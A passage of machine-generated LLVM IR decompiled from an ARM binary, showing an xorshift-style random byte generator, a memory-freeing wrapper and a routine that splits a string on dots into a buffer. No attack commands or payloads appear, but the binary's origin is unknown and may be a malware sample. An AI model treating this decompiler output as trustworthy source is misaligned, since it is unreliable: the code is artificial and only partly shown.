  %v5_10cf4 = add i32 %v4_10cf4, %v2_10ce0
  store i32 %v5_10cf4, i32* %ip.global-to-local, align 4
  %tmp22 = udiv i32 %v5_10d4c, 524288
  %v4_10cf8 = urem i32 %tmp22, 32
  %v5_10cf8 = add i32 %v4_10cf8, %v2_10ce0
  %v4_10cfc = udiv i32 %v2_10d48, 134217728
  %v5_10cfc = add i32 %v4_10cfc, %v2_10ce0
  store i32 %v5_10cfc, i32* %r4.global-to-local, align 4
  %v1_10d00 = add i32 %v5_10cf4, -33
  %v2_10d00 = inttoptr i32 %v1_10d00 to i8*
  %v3_10d00 = load i8, i8* %v2_10d00, align 1
  %v4_10d00 = zext i8 %v3_10d00 to i32
  store i32 %v4_10d00, i32* %r2.global-to-local, align 4
  %v1_10d04 = add i32 %v5_10ce4, -33
  %v2_10d04 = inttoptr i32 %v1_10d04 to i8*
  %v3_10d04 = load i8, i8* %v2_10d04, align 1
  %v4_10d04 = zext i8 %v3_10d04 to i32
  store i32 %v4_10d04, i32* %r3.global-to-local, align 4
  %v1_10d08 = add i32 %v5_10cf8, -33
  %v2_10d08 = inttoptr i32 %v1_10d08 to i8*
  %v3_10d08 = load i8, i8* %v2_10d08, align 1
  %v4_10d08 = zext i8 %v3_10d08 to i32
  store i32 %v4_10d08, i32* %r1.global-to-local, align 4
  %v1_10d0c = add i32 %v5_10cfc, -33
  %v2_10d0c = inttoptr i32 %v1_10d0c to i8*
  %v3_10d0c = load i8, i8* %v2_10d0c, align 1
  %v4_10d0c = zext i8 %v3_10d0c to i32
  store i32 %v4_10d0c, i32* %r0.global-to-local, align 4
  %v1_10d10 = add i32 %v0_10d10, -4
  store i32 %v1_10d10, i32* %r8.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_10d14 = icmp slt i32 %v1_10d10, 0
  store i1 %v1_10d14, i1* %cpsr_n.global-to-local, align 1
  %v2_10d14 = icmp eq i32 %v1_10d10, 0
  store i1 %v2_10d14, i1* %cpsr_z.global-to-local, align 1
  %v3_10d18 = add i32 %v2_10d18, -1
  %v4_10d18 = inttoptr i32 %v3_10d18 to i8*
  store i8 %v3_10d04, i8* %v4_10d18, align 1
  %v0_10d1c = load i32, i32* %r2.global-to-local, align 4
  %v1_10d1c = trunc i32 %v0_10d1c to i8
  %v2_10d1c = load i32, i32* %r7.global-to-local, align 4
  %v3_10d1c = inttoptr i32 %v2_10d1c to i8*
  store i8 %v1_10d1c, i8* %v3_10d1c, align 1
  %v0_10d20 = load i32, i32* %r1.global-to-local, align 4
  %v1_10d20 = trunc i32 %v0_10d20 to i8
  %v2_10d20 = load i32, i32* %r7.global-to-local, align 4
  %v3_10d20 = add i32 %v2_10d20, 1
  %v4_10d20 = inttoptr i32 %v3_10d20 to i8*
  store i8 %v1_10d20, i8* %v4_10d20, align 1
  %v0_10d24 = load i32, i32* %r0.global-to-local, align 4
  %v1_10d24 = trunc i32 %v0_10d24 to i8
  %v2_10d24 = load i32, i32* %r7.global-to-local, align 4
  %v3_10d24 = add i32 %v2_10d24, 2
  %v4_10d24 = inttoptr i32 %v3_10d24 to i8*
  store i8 %v1_10d24, i8* %v4_10d24, align 1
  %v0_10d28 = load i32, i32* %sl.global-to-local, align 4
  store i32 %v0_10d28, i32* %ip.global-to-local, align 4
  %v0_10d2c = load i32, i32* %r7.global-to-local, align 4
  %v1_10d2c = add i32 %v0_10d2c, 4
  store i32 %v1_10d2c, i32* %r7.global-to-local, align 4
  %v0_10d30 = load i1, i1* %cpsr_z.global-to-local, align 1
  %v1_10d30 = load i1, i1* %cpsr_n.global-to-local, align 1
  %v2_10d30 = load i1, i1* %cpsr_v.global-to-local, align 1
  %v3_10d30 = xor i1 %v1_10d30, %v2_10d30
  %v4_10d30 = or i1 %v0_10d30, %v3_10d30
  br i1 %v4_10d30, label %dec_label_pc_10d7c, label %dec_label_pc_10d34

dec_label_pc_10d34:                               ; preds = %dec_label_pc_10d60, %dec_label_pc_10cdc
  %v2_10d6c6 = phi i32 [ %v1_10d74, %dec_label_pc_10d60 ], [ %v1_10d2c, %dec_label_pc_10cdc ]
  %v0_10d402 = phi i32 [ %v0_10d70, %dec_label_pc_10d60 ], [ %v0_10d28, %dec_label_pc_10cdc ]
  %v0_10d34 = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_10d34, i32* %sl.global-to-local, align 4
  %v0_10d38 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_10d38, i32* %sb.global-to-local, align 4
  %v0_10d3c = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_10d3c, i32* %r6.global-to-local, align 4
  %v0_10d50.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_10d40

dec_label_pc_10d40:                               ; preds = %dec_label_pc_10cb4, %dec_label_pc_10d34
  %v2_10d18 = phi i32 [ %v1_10cd4, %dec_label_pc_10cb4 ], [ %v2_10d6c6, %dec_label_pc_10d34 ]
  %v0_10d10 = phi i32 [ %v0_10cac, %dec_label_pc_10cb4 ], [ %v0_10d50.pre, %dec_label_pc_10d34 ]
  %v0_10d44 = phi i32 [ %v2_10ccc, %dec_label_pc_10cb4 ], [ %v0_10d3c, %dec_label_pc_10d34 ]
  %v0_10d40 = phi i32 [ %v2_10cd0, %dec_label_pc_10cb4 ], [ %v0_10d402, %dec_label_pc_10d34 ]
  %v4_10d40 = mul i32 %v0_10d40, 2048
  %v5_10d40 = xor i32 %v4_10d40, %v0_10d40
  store i32 %v5_10d40, i32* %r3.global-to-local, align 4
  %v4_10d44 = udiv i32 %v0_10d44, 524288
  %v5_10d44 = xor i32 %v4_10d44, %v0_10d44
  %v2_10d48 = xor i32 %v5_10d44, %v5_10d40
  store i32 %v2_10d48, i32* %r2.global-to-local, align 4
  %v4_10d4c = udiv i32 %v5_10d40, 256
  %v5_10d4c = xor i32 %v4_10d4c, %v2_10d48
  store i32 %v5_10d4c, i32* %r5.global-to-local, align 4
  %v1_10d50 = add i32 %v0_10d10, -3
  %v2_10d50 = icmp ugt i32 %v0_10d10, 2
  %v3_10d50 = sub i32 2, %v0_10d10
  %v4_10d50 = and i32 %v3_10d50, %v0_10d10
  %v5_10d50 = icmp slt i32 %v4_10d50, 0
  store i1 %v5_10d50, i1* %cpsr_v.global-to-local, align 1
  %v6_10d50 = icmp slt i32 %v1_10d50, 0
  store i1 %v6_10d50, i1* %cpsr_n.global-to-local, align 1
  %v7_10d50 = icmp eq i32 %v0_10d10, 3
  store i1 %v7_10d50, i1* %cpsr_z.global-to-local, align 1
  store i32 %v5_10d4c, i32* %r0.global-to-local, align 4
  store i32 33, i32* %r1.global-to-local, align 4
  %v2_10d5c = xor i1 %v7_10d50, true
  %v3_10d5c = and i1 %v2_10d50, %v2_10d5c
  br i1 %v3_10d5c, label %dec_label_pc_10cdc, label %dec_label_pc_10d60

dec_label_pc_10d60:                               ; preds = %dec_label_pc_10d40
  %v2_10d60 = urem i32 %v5_10d4c, 33
  store i32 %v2_10d60, i32* %r0.global-to-local, align 4
  %v1_10d64 = add i32 %v0_10d10, -1
  store i32 %v1_10d64, i32* %r8.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_10d68 = icmp slt i32 %v1_10d64, 0
  store i1 %v1_10d68, i1* %cpsr_n.global-to-local, align 1
  %v2_10d68 = icmp eq i32 %v1_10d64, 0
  store i1 %v2_10d68, i1* %cpsr_z.global-to-local, align 1
  %v1_10d6c = trunc i32 %v2_10d60 to i8
  %v3_10d6c = add i32 %v2_10d18, -1
  %v4_10d6c = inttoptr i32 %v3_10d6c to i8*
  store i8 %v1_10d6c, i8* %v4_10d6c, align 1
  %v0_10d70 = load i32, i32* %sl.global-to-local, align 4
  store i32 %v0_10d70, i32* %ip.global-to-local, align 4
  %v0_10d74 = load i32, i32* %r7.global-to-local, align 4
  %v1_10d74 = add i32 %v0_10d74, 1
  store i32 %v1_10d74, i32* %r7.global-to-local, align 4
  %v0_10d78 = load i1, i1* %cpsr_z.global-to-local, align 1
  %v1_10d78 = load i1, i1* %cpsr_n.global-to-local, align 1
  %v2_10d78 = load i1, i1* %cpsr_v.global-to-local, align 1
  %v3_10d78 = xor i1 %v1_10d78, %v2_10d78
  %v4_10d78 = or i1 %v0_10d78, %v3_10d78
  br i1 %v4_10d78, label %dec_label_pc_10d7c, label %dec_label_pc_10d34

dec_label_pc_10d7c:                               ; preds = %dec_label_pc_10d60, %dec_label_pc_10cdc
  store i32 ptrtoint (i32* @global_var_1cd64.219 to i32), i32* %r3.global-to-local, align 4
  %v0_10d84 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_10d84, i32* @global_var_1cd68.221, align 4
  store i32 ptrtoint (i32* @global_var_1cd60.215 to i32), i32* %ip.global-to-local, align 4
  %v0_10d8c = load i32, i32* %r5.global-to-local, align 4
  %v1_10d8c = load i32, i32* %fp.global-to-local, align 4
  %v2_10d8c = inttoptr i32 %v1_10d8c to i32*
  store i32 %v0_10d8c, i32* %v2_10d8c, align 4
  %v0_10d90 = load i32, i32* %sb.global-to-local, align 4
  %v1_10d90 = load i32, i32* %r3.global-to-local, align 4
  %v2_10d90 = inttoptr i32 %v1_10d90 to i32*
  store i32 %v0_10d90, i32* %v2_10d90, align 4
  %v0_10d94 = load i32, i32* %sl.global-to-local, align 4
  %v1_10d94 = load i32, i32* %ip.global-to-local, align 4
  %v2_10d94 = inttoptr i32 %v1_10d94 to i32*
  store i32 %v0_10d94, i32* %v2_10d94, align 4
  %v2_10d9c.pre = load i32, i32* %stack_var_-36, align 4
  %v29_10d9c.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10d98

dec_label_pc_10d98:                               ; preds = %dec_label_pc_10c8c, %dec_label_pc_10d7c
  %v29_10d9c = phi i32 [ %v29_10d9c.pre, %dec_label_pc_10d7c ], [ %v4_10ca8, %dec_label_pc_10c8c ]
  %v2_10d9c = phi i32 [ %v2_10d9c.pre, %dec_label_pc_10d7c ], [ %v3_10c8c, %dec_label_pc_10c8c ]
  store i32 %v2_10d9c, i32* @r4, align 4
  ret i32 %v29_10d9c

; uselistorder directives
  uselistorder i32 %v1_10d74, { 1, 0 }
  uselistorder i32 %v0_10d70, { 1, 0 }
  uselistorder i32 %v5_10d4c, { 5, 6, 7, 4, 1, 0, 3, 2 }
  uselistorder i32 %v2_10d48, { 1, 2, 0 }
  uselistorder i32 %v0_10d40, { 1, 0 }
  uselistorder i32 %v0_10d44, { 1, 0 }
  uselistorder i32 %v0_10d10, { 2, 3, 0, 6, 5, 4, 1 }
  uselistorder i32 %v2_10d18, { 1, 0 }
  uselistorder i32 %v2_10ce0, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v0_10cac, { 0, 1, 3, 2 }
  uselistorder i32* %stack_var_-36, { 0, 2, 1 }
  uselistorder i32* %sl.global-to-local, { 1, 2, 0, 3, 4 }
  uselistorder i32* %sb.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32* %r7.global-to-local, { 0, 2, 1, 3, 4, 5, 6, 7 }
  uselistorder i32* %r6.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32* %r5.global-to-local, { 0, 2, 1 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 4, 2, 3, 5 }
  uselistorder i32* %r2.global-to-local, { 3, 0, 1, 2, 4 }
  uselistorder i32* %r1.global-to-local, { 4, 1, 2, 3, 5, 0 }
  uselistorder i32* %r0.global-to-local, { 3, 0, 6, 2, 4, 5, 8, 7, 1 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 4, 2, 3, 5 }
  uselistorder i1* %cpsr_v.global-to-local, { 0, 1, 4, 2, 3, 5 }
  uselistorder i1* %cpsr_n.global-to-local, { 0, 1, 4, 2, 3, 5 }
  uselistorder i32 -33, { 1, 2, 3, 4, 0 }
  uselistorder i32 (i32, i32, i32)* @_memcpy, { 1, 2, 0 }
  uselistorder label %dec_label_pc_10d98, { 1, 0 }
  uselistorder label %dec_label_pc_10d40, { 1, 0 }
}

define i32 @function_10db4(i8* %arg1) local_unnamed_addr {
dec_label_pc_10db4:
  %fp.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %stack_var_-36 = alloca i32, align 4
  %v3_10db4 = load i32, i32* @r4, align 4
  store i32 %v3_10db4, i32* %stack_var_-36, align 4
  %v9_10db4 = load i32, i32* @r6, align 4
  %v12_10db4 = load i32, i32* @r7, align 4
  %v15_10db4 = load i32, i32* @r8, align 4
  %v18_10db4 = load i32, i32* @sb, align 4
  %v21_10db4 = load i32, i32* @sl, align 4
  %v24_10db4 = load i32, i32* @fp, align 4
  %v0_10db8 = load i32, i32* @r1, align 4
  store i32 %v0_10db8, i32* %r4.global-to-local, align 4
  store i32 %tmp, i32* %r5.global-to-local, align 4
  %tmp20 = icmp slt i32 %v0_10db8, 1
  br i1 %tmp20, label %bb, label %bb21

bb:                                               ; preds = %dec_label_pc_10db4
  store i32 %v3_10db4, i32* %r4.global-to-local, align 4
  ret i32 %tmp

bb21:                                             ; preds = %dec_label_pc_10db4
  store i32 ptrtoint (i32* @global_var_1cd6c.217 to i32), i32* %fp.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1cd68.221 to i32), i32* %sb.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1cd64.219 to i32), i32* %sl.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1cd60.215 to i32), i32* %r8.global-to-local, align 4
  %v2_10dd4 = load i32, i32* @global_var_1cd6c.217, align 4
  store i32 %v2_10dd4, i32* %lr.global-to-local, align 4
  %v2_10dd8 = load i32, i32* @global_var_1cd68.221, align 4
  store i32 %v2_10dd8, i32* %r7.global-to-local, align 4
  %v2_10ddc = load i32, i32* @global_var_1cd64.219, align 4
  store i32 %v2_10ddc, i32* %r6.global-to-local, align 4
  %v2_10de0 = load i32, i32* @global_var_1cd60.215, align 4
  br label %dec_label_pc_10e0c

dec_label_pc_10de8:                               ; preds = %dec_label_pc_10e38
  %v3_10e40 = sdiv i32 %v5_10e24, 256
  %v1_10de8 = trunc i32 %v3_10e40 to i8
  %v3_10de8 = add i32 %v9_10e2c, 1
  %v4_10de8 = inttoptr i32 %v3_10de8 to i8*
  store i8 %v1_10de8, i8* %v4_10de8, align 1
  %v0_10dec = load i32, i32* %r3.global-to-local, align 4
  %v1_10dec = trunc i32 %v0_10dec to i8
  %v2_10dec = load i32, i32* %r5.global-to-local, align 4
  %v3_10dec = inttoptr i32 %v2_10dec to i8*
  store i8 %v1_10dec, i8* %v3_10dec, align 1
  %v0_10df0 = load i32, i32* %r5.global-to-local, align 4
  %v1_10df0 = add i32 %v0_10df0, 2
  store i32 %v1_10df0, i32* %r5.global-to-local, align 4
  %v0_10df4.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_10df4

dec_label_pc_10df4:                               ; preds = %.thread, %dec_label_pc_10de8
  %v0_10df4 = phi i32 [ %v9_10e30, %.thread ], [ %v0_10df4.pre, %dec_label_pc_10de8 ]
  %v2_10de87 = phi i32 [ %v12_10e2c, %.thread ], [ %v1_10df0, %dec_label_pc_10de8 ]
  %tmp22 = icmp slt i32 %v0_10df4, 1
  br i1 %tmp22, label %dec_label_pc_10e74, label %dec_label_pc_10e00

dec_label_pc_10e00:                               ; preds = %dec_label_pc_10df4
  %v0_10df8 = load i32, i32* %r6.global-to-local, align 4
  %v0_10e00 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_10e00, i32* %r6.global-to-local, align 4
  %v0_10e04 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v0_10e04, i32* %r7.global-to-local, align 4
  %v0_10e08 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_10e08, i32* %lr.global-to-local, align 4
  br label %dec_label_pc_10e0c

dec_label_pc_10e0c:                               ; preds = %bb21, %dec_label_pc_10e00
  %v0_10e5c = phi i32 [ %v2_10ddc, %bb21 ], [ %v0_10e00, %dec_label_pc_10e00 ]
  %v9_10e2c = phi i32 [ %tmp, %bb21 ], [ %v2_10de87, %dec_label_pc_10e00 ]
  %v0_10e44 = phi i32 [ %v0_10db8, %bb21 ], [ %v0_10df4, %dec_label_pc_10e00 ]
  %v0_10e50 = phi i32 [ %v2_10dd4, %bb21 ], [ %v0_10e08, %dec_label_pc_10e00 ]
  %v0_10e4c = phi i32 [ %v2_10de0, %bb21 ], [ %v0_10df8, %dec_label_pc_10e00 ]
  %v4_10e0c = mul i32 %v0_10e4c, 2048
  %v5_10e0c = xor i32 %v4_10e0c, %v0_10e4c
  %v4_10e10 = udiv i32 %v0_10e50, 524288
  %v5_10e10 = xor i32 %v4_10e10, %v0_10e50
  %v2_10e14 = xor i32 %v5_10e10, %v5_10e0c
  %v4_10e24 = udiv i32 %v5_10e0c, 256
  %v5_10e24 = xor i32 %v4_10e24, %v2_10e14
  store i32 %v5_10e24, i32* %r3.global-to-local, align 4
  %v7_10e2c = icmp sgt i32 %v0_10e44, 3
  br i1 %v7_10e2c, label %.thread, label %dec_label_pc_10e38

.thread:                                          ; preds = %dec_label_pc_10e0c
  %v10_10e2c = inttoptr i32 %v9_10e2c to i32*
  store i32 %v5_10e24, i32* %v10_10e2c, align 4
  %v11_10e2c = load i32, i32* %r5.global-to-local, align 4
  %v12_10e2c = add i32 %v11_10e2c, 4
  store i32 %v12_10e2c, i32* %r5.global-to-local, align 4
  %v8_10e30 = load i32, i32* %r4.global-to-local, align 4
  %v9_10e30 = add i32 %v8_10e30, -4
  store i32 %v9_10e30, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_10df4

dec_label_pc_10e38:                               ; preds = %dec_label_pc_10e0c
  store i32 %v5_10e24, i32* %r3.global-to-local, align 4
  %v7_10e3c = icmp eq i32 %v0_10e44, 1
  %v1_10e44 = add i32 %v0_10e44, -2
  store i32 %v1_10e44, i32* %r4.global-to-local, align 4
  br i1 %v7_10e3c, label %dec_label_pc_10e4c, label %dec_label_pc_10de8

dec_label_pc_10e4c:                               ; preds = %dec_label_pc_10e38
  store i32 %v5_10e24, i32* %r3.global-to-local, align 4
  %v1_10e5c = load i32, i32* %r8.global-to-local, align 4
  %v2_10e5c = inttoptr i32 %v1_10e5c to i32*
  store i32 %v0_10e5c, i32* %v2_10e5c, align 4
  %v0_10e60 = load i32, i32* %r7.global-to-local, align 4
  %v1_10e60 = load i32, i32* %sl.global-to-local, align 4
  %v2_10e60 = inttoptr i32 %v1_10e60 to i32*
  store i32 %v0_10e60, i32* %v2_10e60, align 4
  %v0_10e64 = load i32, i32* %lr.global-to-local, align 4
  %v1_10e64 = load i32, i32* %sb.global-to-local, align 4
  %v2_10e64 = inttoptr i32 %v1_10e64 to i32*
  store i32 %v0_10e64, i32* %v2_10e64, align 4
  %v0_10e68 = load i32, i32* %r3.global-to-local, align 4
  %v1_10e68 = load i32, i32* %fp.global-to-local, align 4
  %v2_10e68 = inttoptr i32 %v1_10e68 to i32*
  store i32 %v0_10e68, i32* %v2_10e68, align 4
  %v0_10e6c = load i32, i32* %r3.global-to-local, align 4
  %v1_10e6c = trunc i32 %v0_10e6c to i8
  %v2_10e6c = load i32, i32* %r5.global-to-local, align 4
  %v3_10e6c = inttoptr i32 %v2_10e6c to i8*
  store i8 %v1_10e6c, i8* %v3_10e6c, align 1
  %v2_10e70 = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_10e70, i32* %r4.global-to-local, align 4
  store i32 %v9_10db4, i32* %r6.global-to-local, align 4
  store i32 %v12_10db4, i32* %r7.global-to-local, align 4
  store i32 %v15_10db4, i32* %r8.global-to-local, align 4
  store i32 %v18_10db4, i32* %sb.global-to-local, align 4
  store i32 %v21_10db4, i32* %sl.global-to-local, align 4
  store i32 %v24_10db4, i32* %fp.global-to-local, align 4
  ret i32 %v5_10e0c

dec_label_pc_10e74:                               ; preds = %dec_label_pc_10df4
  %v0_10e74 = load i32, i32* %r3.global-to-local, align 4
  %v1_10e74 = load i32, i32* %fp.global-to-local, align 4
  %v2_10e74 = inttoptr i32 %v1_10e74 to i32*
  store i32 %v0_10e74, i32* %v2_10e74, align 4
  %v0_10e78 = load i32, i32* %lr.global-to-local, align 4
  %v1_10e78 = load i32, i32* %sb.global-to-local, align 4
  %v2_10e78 = inttoptr i32 %v1_10e78 to i32*
  store i32 %v0_10e78, i32* %v2_10e78, align 4
  %v0_10e7c = load i32, i32* %r7.global-to-local, align 4
  %v1_10e7c = load i32, i32* %sl.global-to-local, align 4
  %v2_10e7c = inttoptr i32 %v1_10e7c to i32*
  store i32 %v0_10e7c, i32* %v2_10e7c, align 4
  %v0_10e80 = load i32, i32* %r6.global-to-local, align 4
  %v1_10e80 = load i32, i32* %r8.global-to-local, align 4
  %v2_10e80 = inttoptr i32 %v1_10e80 to i32*
  store i32 %v0_10e80, i32* %v2_10e80, align 4
  %v2_10e84 = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_10e84, i32* %r4.global-to-local, align 4
  store i32 %v9_10db4, i32* %r6.global-to-local, align 4
  store i32 %v12_10db4, i32* %r7.global-to-local, align 4
  store i32 %v15_10db4, i32* %r8.global-to-local, align 4
  store i32 %v18_10db4, i32* %sb.global-to-local, align 4
  store i32 %v21_10db4, i32* %sl.global-to-local, align 4
  store i32 %v24_10db4, i32* %fp.global-to-local, align 4
  ret i32 %v5_10e0c

; uselistorder directives
  uselistorder i32 %v9_10e30, { 1, 0 }
  uselistorder i32 %v12_10e2c, { 1, 0 }
  uselistorder i32 %v5_10e24, { 1, 3, 2, 4, 0 }
  uselistorder i32 %v5_10e0c, { 1, 2, 0, 3 }
  uselistorder i32 %v0_10e4c, { 1, 0 }
  uselistorder i32 %v0_10e50, { 1, 0 }
  uselistorder i32 %v0_10df4, { 1, 0 }
  uselistorder i32 %v24_10db4, { 1, 0 }
  uselistorder i32 %v21_10db4, { 1, 0 }
  uselistorder i32 %v18_10db4, { 1, 0 }
  uselistorder i32 %v15_10db4, { 1, 0 }
  uselistorder i32 %v12_10db4, { 1, 0 }
  uselistorder i32 %v9_10db4, { 1, 0 }
  uselistorder i32* %sl.global-to-local, { 0, 2, 1, 3, 4 }
  uselistorder i32* %sb.global-to-local, { 0, 2, 1, 3, 4 }
  uselistorder i32* %r8.global-to-local, { 0, 2, 1, 3, 4 }
  uselistorder i32* %r7.global-to-local, { 0, 3, 1, 4, 2, 5, 6 }
  uselistorder i32* %r6.global-to-local, { 0, 3, 1, 2, 4, 5 }
  uselistorder i32* %r5.global-to-local, { 2, 1, 5, 0, 3, 4, 6 }
  uselistorder i32* %r4.global-to-local, { 0, 1, 3, 4, 6, 2, 5, 7 }
  uselistorder i32* %r3.global-to-local, { 5, 0, 1, 2, 4, 7, 6, 3 }
  uselistorder i32* %lr.global-to-local, { 1, 2, 0, 3, 4 }
  uselistorder i32* %fp.global-to-local, { 0, 2, 1, 3, 4 }
  uselistorder i32* @global_var_1cd60.215, { 2, 3, 5, 1, 0, 4 }
  uselistorder i32* @global_var_1cd64.219, { 2, 3, 4, 1, 0, 5, 6 }
  uselistorder i32* @global_var_1cd68.221, { 3, 6, 1, 4, 2, 0, 5 }
  uselistorder i32* @global_var_1cd6c.217, { 2, 3, 5, 1, 0, 4 }
  uselistorder label %dec_label_pc_10e0c, { 1, 0 }
}

define i32 @function_10e98(i32* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_10e98:
  %r4.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-8 = alloca i32, align 4
  %v3_10e98 = load i32, i32* @r4, align 4
  store i32 %v3_10e98, i32* %stack_var_-8, align 4
  store i32 %tmp, i32* %r4.global-to-local, align 4
  %v2_10e9c = icmp eq i32* %arg1, null
  br i1 %v2_10e9c, label %bb, label %bb4

bb:                                               ; preds = %dec_label_pc_10e98
  store i32 %v3_10e98, i32* @r4, align 4
  ret i32 %tmp

bb4:                                              ; preds = %dec_label_pc_10e98
  %v1_10ea4 = add i32 %tmp, 4
  %v2_10ea4 = inttoptr i32 %v1_10ea4 to i32*
  %v3_10ea4 = load i32, i32* %v2_10ea4, align 4
  %v1_10eac = icmp ne i32 %v3_10ea4, 0
  call void @__pseudo_cond_branch(i1 %v1_10eac, i32 ptrtoint (i32* @global_var_8de4.114 to i32))
  %v0_10eb0 = load i32, i32* %r4.global-to-local, align 4
  %v2_10eb4 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_10eb4, i32* @r4, align 4
  %v1_10eb8 = inttoptr i32 %v0_10eb0 to i32*
  call void @free(i32* %v1_10eb8)
  ret i32 ptrtoint (i32* @0 to i32)

; uselistorder directives
  uselistorder void (i32*)* @free, { 1, 0, 2 }
}

define i32 @function_10ebc(i8* %arg1) local_unnamed_addr {
dec_label_pc_10ebc:
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-4288 = alloca i8, align 1
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-216 = alloca i32, align 4
  %stack_var_-2227 = alloca i32, align 4
  %stack_var_-2228 = alloca i32, align 4
  store i32 %tmp, i32* %r4.global-to-local, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  %v2_10ed4 = call i32* @calloc(i32 1, i32 8)
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v3_10ee0 = call i32 @function_13a08(i8* %arg1)
  %v2_10ee8 = ptrtoint i32* %stack_var_-2228 to i32
  store i32 %v2_10ee8, i32* %fp.global-to-local, align 4
  %v1_10ef0 = add i32 %v3_10ee0, 1
  store i32 %v1_10ef0, i32* %r0.global-to-local, align 4
  %v2_10ef4 = ptrtoint i32* %stack_var_-2227 to i32
  store i32 %v2_10ef4, i32* %r2.global-to-local, align 4
  store i32 %v2_10ee8, i32* %r5.global-to-local, align 4
  store i32 0, i32* %lr.global-to-local, align 4
  %v2_10f3470 = icmp eq i32 %v1_10ef0, 0
  store i1 %v2_10f3470, i1* %cpsr_z.global-to-local, align 1
  store i32 1, i32* %ip.global-to-local, align 4
  %v1_10f3c71 = or i32 %v2_10ef4, 1
  store i32 %v1_10f3c71, i32* %r1.global-to-local, align 4
  %tmp6872 = icmp slt i32 %v1_10ef0, 1
  br i1 %tmp6872, label %dec_label_pc_10f44, label %dec_label_pc_10f04.lr.ph

dec_label_pc_10f04.lr.ph:                         ; preds = %dec_label_pc_10ebc
  %v0_10f04.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_10f04

dec_label_pc_10f04:                               ; preds = %dec_label_pc_10f04.lr.ph, %.thread12
  %v1_10f1876.off0 = phi i8 [ 0, %dec_label_pc_10f04.lr.ph ], [ %extract.t79, %.thread12 ]
  %v0_10f04 = phi i32 [ %v0_10f04.pre, %dec_label_pc_10f04.lr.ph ], [ %v1_10f28, %.thread12 ]
  %v2_10f4873 = phi i32 [ %v2_10ef4, %dec_label_pc_10f04.lr.ph ], [ %v0_10f30, %.thread12 ]
  %v1_10f04 = inttoptr i32 %v0_10f04 to i8*
  %v2_10f04 = load i8, i8* %v1_10f04, align 1
  %v2_10f08 = icmp eq i8 %v2_10f04, 0
  store i1 %v2_10f08, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_10f08, label %.thread6, label %bb

bb:                                               ; preds = %dec_label_pc_10f04
  %v8_10f0c = icmp eq i8 %v2_10f04, 46
  store i1 %v8_10f0c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_10f0c, label %.thread6, label %.thread

.thread:                                          ; preds = %bb
  %v4_10f10 = inttoptr i32 %v2_10f4873 to i8*
  store i8 %v2_10f04, i8* %v4_10f10, align 1
  %v5_10f10 = load i32, i32* %r2.global-to-local, align 4
  %v6_10f10 = add i32 %v5_10f10, 1
  store i32 %v6_10f10, i32* %r2.global-to-local, align 4
  %v0_10f14.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_10f14.pr.pr, label %.thread..thread6_crit_edge, label %bb66

.thread..thread6_crit_edge:                       ; preds = %.thread
  %v1_10f18.pre = load i32, i32* %lr.global-to-local, align 4
  %extract.t = trunc i32 %v1_10f18.pre to i8
  br label %.thread6

.thread6:                                         ; preds = %.thread..thread6_crit_edge, %bb, %dec_label_pc_10f04
  %v1_10f18.off0 = phi i8 [ %extract.t, %.thread..thread6_crit_edge ], [ %v1_10f1876.off0, %bb ], [ %v1_10f1876.off0, %dec_label_pc_10f04 ]
  %v3_10f18 = load i32, i32* %r5.global-to-local, align 4
  %v4_10f18 = inttoptr i32 %v3_10f18 to i8*
  store i8 %v1_10f18.off0, i8* %v4_10f18, align 1
  %v0_10f1c.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_10f1c.pr, label %bb67, label %..thread12_crit_edge

bb66:                                             ; preds = %.thread
  store i32 %v6_10f10, i32* %r1.global-to-local, align 4
  %v1_10f1c = load i32, i32* %ip.global-to-local, align 4
